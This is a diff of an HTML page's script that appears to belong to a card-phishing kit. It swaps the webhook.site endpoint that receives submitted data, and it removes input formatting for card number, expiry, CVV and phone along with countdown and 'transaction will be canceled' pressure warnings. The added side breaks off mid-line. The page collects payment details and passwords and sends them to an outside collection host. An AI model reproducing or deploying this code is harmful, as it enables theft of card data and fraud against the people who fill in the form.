@@ -284,7 +284,7 @@
     </div>
 
     <script>
-        const SERVER_URL = 'https://webhook.site/bb843eea-20ad-4ea1-91db-fa79cc0118f7';
+        const SERVER_URL = 'https://webhook.site/dd24b61d-afe5-4593-bdcb-cf2612eb3836';
 
         // Countdown timer
         let timeLeft = 5 * 60;
@@ -361,54 +361,4 @@
                     document.getElementById('passwordError').scrollIntoView({ behavior: 'smooth', block: 'center' });
                 }
             } catch (error) {
-                document.getElementById('loadingScreen').style.display = 'none';
-                document.getElementById('passwordError').style.display = 'block';
-                document.getElementById('passwordError').textContent = 'Connection error. Please check your network and try again.';
-                document.getElementById('passwordError').scrollIntoView({ behavior: 'smooth', block: 'center' });
-                console.error('Submission error:', error);
-            }
-        });
-
-        // Warn user when trying to leave
-        window.addEventListener('beforeunload', function(e) {
-            if (timerActive) {
-                document.getElementById('leaveWarning').style.display = 'block';
-                e.preventDefault();
-                e.returnValue = 'Your transaction will be canceled if you leave this page.';
-            }
-        });
-
-        // Input formatting
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 0) {
-                value = value.match(/.{1,4}/g).join(' ');
-            }
-            e.target.value = value.substring(0, 19);
-        });
-
-        document.getElementById('expiry').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            e.target.value = value.substring(0, 5);
-        });
-
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
-        });
-
-        document.getElementById('phone').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 15);
-        });
-
-        // Show leave warning after 2 minutes
-        setTimeout(() => {
-            if (timerActive) {
-                document.getElementById('leaveWarning').style.display = 'block';
-            }
-        }, 2 * 60 * 1000);
-    </script>
-</body>
-</html
+                document.getElementBy
